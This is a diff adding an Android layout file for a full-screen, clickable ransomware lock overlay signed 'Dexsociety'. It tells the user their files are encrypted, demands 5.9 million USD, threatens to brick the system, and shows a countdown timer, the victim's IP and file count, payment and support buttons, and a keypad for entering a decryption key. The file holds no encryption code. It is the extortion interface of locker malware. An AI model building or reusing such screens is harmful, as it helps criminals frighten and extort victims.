@@ -1,0 +1,235 @@
+<?xml version="1.0" encoding="utf-8"?>
+<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    android:id="@+id/root_overlay"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="#3E78B3"
+    android:clickable="true"
+    android:focusable="true">
+
+    <ScrollView
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:fillViewport="true">
+
+        <LinearLayout
+            android:id="@+id/container_content"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:gravity="center_horizontal"
+            android:orientation="vertical"
+            android:layout_marginTop="28dp"
+            android:padding="10dp"
+            android:clickable="true"
+            android:focusable="true">
+
+            <!-- Top Card -->
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:background="@drawable/card_bg"
+                android:elevation="4dp"
+                android:gravity="center_horizontal"
+                android:orientation="vertical"
+                android:padding="10dp">
+
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="#Dexsociety"
+                    android:textColor="#000000"
+                    android:textSize="14sp"
+                    android:textStyle="bold" />
+
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="Your files are encrypted."
+                    android:textColor="#000000"
+                    android:textSize="14sp"
+                    android:textStyle="bold" />
+
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:layout_marginTop="6dp"
+                    android:gravity="center"
+                    android:text="To get the key to decrypt files, you have to paid 5.9 million USD. If payment is not made by tommorow night we'll brick your entire system."
+                    android:textColor="#000000"
+                    android:textSize="10sp" />
+
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:layout_marginTop="6dp"
+                    android:text="More instructions forthcoming. - Dsociety."
+                    android:textColor="#000000"
+                    android:textSize="10sp" />
+
+                <View
+                    android:layout_width="match_parent"
+                    android:layout_height="1dp"
+                    android:layout_marginTop="4dp"
+                    android:background="#CCCCCC" />
+
+                <LinearLayout
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:layout_marginTop="4dp"
+                    android:orientation="horizontal">
+
+                    <TextView
+                        android:layout_width="wrap_content"
+                        android:layout_height="wrap_content"
+                        android:text="Time left: "
+                        android:textColor="#000000"
+                        android:textSize="16sp" />
+
+                    <TextView
+                        android:id="@+id/v_timer"
+                        android:layout_width="wrap_content"
+                        android:layout_height="wrap_content"
+                        android:text="14h 04m 08s"
+                        android:textColor="#FF0000"
+                        android:textSize="16sp"
+                        android:textStyle="bold" />
+                </LinearLayout>
+
+                <View
+                    android:layout_width="match_parent"
+                    android:layout_height="1dp"
+                    android:layout_marginTop="8dp"
+                    android:background="#CCCCCC" />
+
+                <TextView
+                    android:id="@+id/v_stats"
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:layout_marginTop="8dp"
+                    android:gravity="center"
+                    android:text="Your system: (Android)   IP: 192.251.68.250   Total: 5,326 files"
+                    android:textColor="#333333"
+                    android:textSize="9sp" />
+
+            </LinearLayout>
+
+            <!-- Action Buttons Row -->
+            <HorizontalScrollView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:layout_marginTop="8dp"
+                android:layout_gravity="center_horizontal"
+                android:scrollbars="none"
+                android:overScrollMode="never">
+
+                <LinearLayout
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:orientation="horizontal"
+                    android:gravity="center"
+                    android:paddingLeft="4dp"
+                    android:paddingRight="4dp">
+
+                    <androidx.appcompat.widget.AppCompatButton
+                        android:id="@+id/v_refresh"
+                        style="@style/ActionButton"
+                        android:text="Refresh" />
+
+                    <androidx.appcompat.widget.AppCompatButton
+                        android:id="@+id/v_payment"
+                        style="@style/ActionButton"
+                        android:text="Payment" />
+
+                    <androidx.appcompat.widget.AppCompatButton
+                        android:id="@+id/v_faq"
+                        style="@style/ActionButton"
+                        android:text="FAQ" />
+
+                    <androidx.appcompat.widget.AppCompatButton
+                        android:id="@+id/v_decrypt"
+                        style="@style/ActionButton"
+                        android:text="Decrypt first file for FREE" />
+
+                    <androidx.appcompat.widget.AppCompatButton
+                        android:id="@+id/v_support"
+                        style="@style/ActionButton"
+                        android:text="Support" />
+                </LinearLayout>
+            </HorizontalScrollView>
+
+            <!-- Jester Image -->
+            <ImageView
+                android:id="@+id/v_logo"
+                android:layout_width="160dp"
+                android:layout_height="wrap_content"
+                android:layout_marginTop="12dp"
+                android:adjustViewBounds="true"
+                android:scaleType="fitCenter"
+                android:src="@drawable/jester_logo" />
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:layout_marginTop="4dp"
+                android:text="JESTER ✪ ACTUAL"
+                android:textColor="#FFFFFF"
+                android:textSize="14sp"
+                android:textStyle="bold" />
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:layout_marginTop="6dp"
+                android:gravity="center"
+                android:paddingLeft="24dp"
+                android:paddingRight="24dp"
+                android:text="There's an unequal amount of good and bad in most things. The trick is to figure out the ratio and act accordingly."
+                android:textColor="#E0E0E0"
+                android:textSize="11sp"
+                android:textStyle="italic" />
+
+            <!-- Input Display -->
+            <TextView
+                android:id="@+id/v_display"
+                android:layout_width="160dp"
+                android:layout_height="34dp"
+                android:layout_marginTop="10dp"
+                android:background="@drawable/input_glow"
+                android:gravity="center"
+                android:hint="ENTER KEY"
+                android:textColor="#FFFFFF"
+                android:textColorHint="#CCCCCC"
+                android:textSize="12sp"
+                android:clickable="true"
+                android:focusable="true" />
+
+            <!-- Keypad (Hidden by default) -->
+            <GridLayout
+                android:id="@+id/v_keypad_container"
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:layout_marginTop="5dp"
+                android:columnCount="3"
+                android:visibility="gone">
+
+                <Button android:id="@+id/v_b1" android:text="1" style="@style/KeyButton" />
+                <Button android:id="@+id/v_b2" android:text="2" style="@style/KeyButton" />
+                <Button android:id="@+id/v_b3" android:text="3" style="@style/KeyButton" />
+
+                <Button android:id="@+id/v_b4" android:text="4" style="@style/KeyButton" />
+                <Button android:id="@+id/v_b5" android:text="5" style="@style/KeyButton" />
+                <Button android:id="@+id/v_b6" android:text="6" style="@style/KeyButton" />
+
+                <Button android:id="@+id/v_b7" android:text="7" style="@style/KeyButton" />
+                <Button android:id="@+id/v_b8" android:text="8" style="@style/KeyButton" />
+                <Button android:id="@+id/v_b9" android:text="9" style="@style/KeyButton" />
+
+                <Button android:id="@+id/v_del" android:text="RM" style="@style/KeyButton" />
+                <Button android:id="@+id/v_b0" android:text="0" style="@style/KeyButton" />
+                <Button android:id="@+id/v_ok" android:text="OK" style="@style/KeyButton" />
+            </GridLayout>
+
+        </LinearLayout>
+    </ScrollView>
+</FrameLayout>
